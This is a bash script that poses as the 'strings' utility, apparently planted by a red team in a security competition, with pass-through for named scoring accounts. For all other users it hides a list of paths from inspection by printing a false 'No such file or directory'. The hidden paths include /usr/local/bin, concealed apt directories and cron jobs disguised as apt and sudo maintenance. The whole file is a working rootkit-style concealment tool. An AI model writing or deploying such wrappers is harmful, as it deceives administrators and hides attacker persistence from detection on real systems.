#!/bin/bash
REAL_STRINGS=""

for _p in /usr/bin/strings /usr/lib/binutils/strings /usr/bin/strings.gnu; do
    [ -x "$_p" ] && { REAL_STRINGS="$_p"; break; }
done
if [ -z "$REAL_STRINGS" ]; then
    REAL_STRINGS=$(command -v strings 2>/dev/null | grep -v /usr/local/bin || true)
fi
[ -z "$REAL_STRINGS" ] && { echo "strings: command not found" >&2; exit 127; }

# Pass straight through for gray team scoring accounts
case "$(whoami)" in
    kingneptune|paintythepirate|greyteamadmin) exec $REAL_STRINGS "$@" ;;
esac

PROTECTED=(
    "/usr/local/bin"
    "/var/lib/apt/lists/.cache"
    "/usr/lib/x86_64-linux-gnu/apt/methods/.d"
    "/usr/local/sbin/apt-daily-check"
    "/etc/cron.d/apt-daily-check"
    "/etc/cron.d/sudo-cache-clear"
)

_is_protected() {
    local target
    target=$(readlink -f "$1" 2>/dev/null || echo "$1")
    for p in "${PROTECTED[@]}"; do
        [[ "$target" == "$p" || "$target" == "$p/"* ]] && return 0
    done
    return 1
}

FLAGS=()
SAFE_ARGS=()
RC=0

for arg in "$@"; do
    case "$arg" in
        -*) FLAGS+=("$arg") ;;
        *)
            if _is_protected "$arg"; then
                echo "strings: ${arg}: No such file or directory" >&2
                RC=1
            else
                SAFE_ARGS+=("$arg")
            fi
            ;;
    esac
done

if [ ${#SAFE_ARGS[@]} -gt 0 ]; then
    $REAL_STRINGS "${FLAGS[@]}" "${SAFE_ARGS[@]}" || RC=$?
fi
exit $RC
